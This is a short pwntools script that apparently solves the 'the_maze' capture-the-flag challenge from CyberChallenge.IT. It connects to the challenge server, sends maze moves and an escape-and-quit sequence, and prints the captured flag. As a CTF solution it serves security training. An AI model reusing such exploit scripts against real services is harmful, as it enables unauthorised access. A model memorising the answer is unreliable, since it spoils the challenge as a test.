#!/usr/bin/env python3

from pwn import *

exe = ELF("./the_maze")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("maze.challs.cyberchallenge.it", 9404)

    return r


def main():
    r = conn()

    r.sendlineafter(b'> ', b'ddd')
    r.sendlineafter(b'> ', b'rrrrrrrrrrrrrrrr')
    r.sendlineafter(b'> ', b'dd')
    r.sendlineafter(b'> ', b'\x1b:q!')

    r.recvuntilS(b'CCIT', drop=False)		# Remove previous text
    flag = r.recvlineS()
    log.warn(f'Flag obtained: CCIT{flag}')


if __name__ == "__main__":
    main()
